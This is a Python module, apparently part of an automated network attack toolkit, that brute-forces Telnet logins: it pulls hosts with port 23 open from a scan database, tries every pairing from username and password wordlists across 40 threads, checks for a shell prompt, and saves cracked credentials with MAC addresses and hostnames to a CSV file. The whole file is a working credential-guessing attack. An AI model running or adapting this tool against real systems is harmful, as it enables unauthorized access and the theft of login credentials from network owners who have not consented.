"""
telnet_connector.py - This script performs a brute-force attack on Telnet servers using a list of credentials, 
and logs the successful login attempts.
"""

import os
import pandas as pd
try:
    import telnetlib
except ImportError:
    # telnetlib was removed in Python 3.13+, use fallback
    print("telnetlib not available - telnet functionality disabled")
    telnetlib = None
import threading
import logging
import time
from queue import Queue
from rich.console import Console
from rich.progress import Progress, BarColumn, TextColumn, SpinnerColumn
from shared import SharedData
from logger import Logger
from actions.connector_utils import CredentialChecker

# Configure the logger
logger = Logger(name="telnet_connector.py", level=logging.DEBUG)

# Define the necessary global variables
b_class = "TelnetBruteforce"
b_module = "telnet_connector"
b_status = "brute_force_telnet"
b_port = 23
b_parent = None

class TelnetBruteforce:
    """
    Class to handle the brute-force attack process for Telnet servers.
    """
    def __init__(self, shared_data):
        self.shared_data = shared_data
        self.telnet_connector = TelnetConnector(shared_data)
        logger.info("TelnetConnector initialized.")

    def bruteforce_telnet(self, ip, port):
        """
        Perform brute-force attack on a Telnet server.
        """
        return self.telnet_connector.run_bruteforce(ip, port)
    
    def execute(self, ip, port, row, status_key):
        """
        Execute the brute-force attack.
        Optimization: Skip bruteforce if valid credentials already exist for this host.
        """
        logger.info(f"Executing TelnetBruteforce on {ip}:{port}...")
        
        # Check if we already have valid credentials for this host
        existing_creds = CredentialChecker.check_existing_credentials(
            self.shared_data.telnetfile, ip
        )
        if existing_creds:
            logger.info(f"Telnet credentials already exist for {ip} - verifying instead of bruteforcing...")
            # Verify credentials still work
            if self._verify_credentials(ip, existing_creds):
                logger.success(f"Existing Telnet credentials verified for {ip}: {len(existing_creds)} account(s)")
                return 'success'
            else:
                logger.warning(f"Existing credentials for {ip} no longer valid, will re-bruteforce")
        
        self.shared_data.ragnarorch_status = "TelnetBruteforce"
        success, results = self.bruteforce_telnet(ip, port)
        return 'success' if success else 'failed'
    
    def _verify_credentials(self, ip, credentials):
        """Verify that existing credentials still work (quick check)."""
        for user, password in credentials:
            if self.telnet_connector.telnet_connect(ip, user, password):
                logger.debug(f"Verified Telnet credential for {ip}: {user}")
                return True
        return False

class TelnetConnector:
    """
    Class to handle Telnet connections and credential testing.
    """
    def __init__(self, shared_data):
        self.shared_data = shared_data
        
        # Read from SQLite via shared_data (no more CSV)
        try:
            data = shared_data.read_data()
            self.scan = pd.DataFrame(data)
            if "Ports" not in self.scan.columns:
                self.scan["Ports"] = None
            # Ensure Ports column is string type before using .str accessor
            self.scan["Ports"] = self.scan["Ports"].astype(str)
            self.scan = self.scan[self.scan["Ports"].str.contains("23", na=False)]
        except Exception as e:
            logger.warning(f"Could not read data from database: {e}")
            self.scan = pd.DataFrame(columns=['MAC Address', 'IPs', 'Hostnames', 'Ports', 'Alive'])

        self.users = open(shared_data.usersfile, "r").read().splitlines()
        self.passwords = open(shared_data.passwordsfile, "r").read().splitlines()

        self.lock = threading.Lock()
        self.telnetfile = shared_data.telnetfile
        # If the file does not exist, it will be created
        if not os.path.exists(self.telnetfile):
            logger.info(f"File {self.telnetfile} does not exist. Creating...")
            with open(self.telnetfile, "w") as f:
                f.write("MAC Address,IP Address,Hostname,User,Password,Port\n")
        self.results = []  # List to store results temporarily
        self.queue = Queue()
        self.console = Console()

    def load_scan_file(self):
        """
        Load from SQLite database and filter for Telnet ports.
        """
        try:
            data = self.shared_data.read_data()
            self.scan = pd.DataFrame(data)
            if "Ports" not in self.scan.columns:
                self.scan["Ports"] = None
            # Ensure Ports column is string type before using .str accessor
            self.scan["Ports"] = self.scan["Ports"].astype(str)
            self.scan = self.scan[self.scan["Ports"].str.contains("23", na=False)]
        except Exception as e:
            logger.warning(f"Could not reload data from database: {e}")
            # Keep existing scan data if reload fails
            return

    def telnet_connect(self, adresse_ip, user, password):
        """
        Establish a Telnet connection and try to log in with the provided credentials.
        """
        try:
            tn = telnetlib.Telnet(adresse_ip)
            tn.read_until(b"login: ", timeout=5)
            tn.write(user.encode('ascii') + b"\n")
            if password:
                tn.read_until(b"Password: ", timeout=5)
                tn.write(password.encode('ascii') + b"\n")

            # Wait to see if the login was successful
            time.sleep(2)
            response = tn.expect([b"Login incorrect", b"Password: ", b"$ ", b"# "], timeout=5)
            tn.close()

            # Check if the login was successful
            if response[0] == 2 or response[0] == 3:
                return True
        except Exception as e:
            pass
        return False

    def worker(self, progress, task_id, success_flag):
        """
        Worker thread to process items in the queue.
        """
        while not self.queue.empty():
            if self.shared_data.orchestrator_should_exit:
                logger.info("Orchestrator exit signal received, stopping worker thread.")
                break

            adresse_ip, user, password, mac_address, hostname, port = self.queue.get()
            if self.telnet_connect(adresse_ip, user, password):
                with self.lock:
                    self.results.append([mac_address, adresse_ip, hostname, user, password, port])
                    logger.success(f"Found credentials  IP: {adresse_ip} | User: {user} | Password: {password}")
                    self.save_results()
                    self.removeduplicates()
                    success_flag[0] = True
            self.queue.task_done()
            progress.update(task_id, advance=1)

    def run_bruteforce(self, adresse_ip, port):
        self.load_scan_file()  # Reload the scan file to get the latest IPs and ports

        mac_address = self.scan.loc[self.scan['IPs'] == adresse_ip, 'MAC Address'].values[0]
        hostname = self.scan.loc[self.scan['IPs'] == adresse_ip, 'Hostnames'].values[0]

        total_tasks = len(self.users) * len(self.passwords)
        
        for user in self.users:
            for password in self.passwords:
                if self.shared_data.orchestrator_should_exit:
                    logger.info("Orchestrator exit signal received, stopping bruteforce task addition.")
                    return False, []
                self.queue.put((adresse_ip, user, password, mac_address, hostname, port))

        success_flag = [False]
        threads = []
        
        with Progress(SpinnerColumn(), TextColumn("[progress.description]{task.description}"), BarColumn(), TextColumn("[progress.percentage]{task.percentage:>3.0f}%")) as progress:
            task_id = progress.add_task("[cyan]Bruteforcing Telnet...", total=total_tasks)
            
            for _ in range(40):  # Adjust the number of threads based on the RPi Zero's capabilities
                t = threading.Thread(target=self.worker, args=(progress, task_id, success_flag))
                t.start()
                threads.append(t)

            while not self.queue.empty():
                if self.shared_data.orchestrator_should_exit:
                    logger.info("Orchestrator exit signal received, stopping bruteforce.")
                    while not self.queue.empty():
                        self.queue.get()
                        self.queue.task_done()
                    break

            self.queue.join()

            for t in threads:
                t.join()

        return success_flag[0], self.results  # Return True and the list of successes if at least one attempt was successful

    def save_results(self):
        """
        Save the results of successful login attempts to a CSV file.
        """
        df = pd.DataFrame(self.results, columns=['MAC Address', 'IP Address', 'Hostname', 'User', 'Password', 'Port'])
        df.to_csv(self.telnetfile, index=False, mode='a', header=not os.path.exists(self.telnetfile))
        self.results = []  # Reset temporary results after saving

    def removeduplicates(self):
        """
        Remove duplicate entries from the results file.
        """
        df = pd.read_csv(self.telnetfile)
        df.drop_duplicates(inplace=True)
        df.to_csv(self.telnetfile, index=False)

if __name__ == "__main__":
    shared_data = SharedData()
    try:
        telnet_bruteforce = TelnetBruteforce(shared_data)
        logger.info("Starting Telnet brute-force attack on port 23...")
        
        # Load the netkb file and get the IPs to scan
        ips_to_scan = shared_data.read_data()
        
        # Execute the brute-force attack on each IP
        for row in ips_to_scan:
            ip = row["IPs"]
            logger.info(f"Executing TelnetBruteforce on {ip}...")
            telnet_bruteforce.execute(ip, b_port, row, b_status)
        
        logger.info(f"Total number of successes: {len(telnet_bruteforce.telnet_connector.results)}")
        exit(len(telnet_bruteforce.telnet_connector.results))
    except Exception as e:
        logger.error(f"Error: {e}")
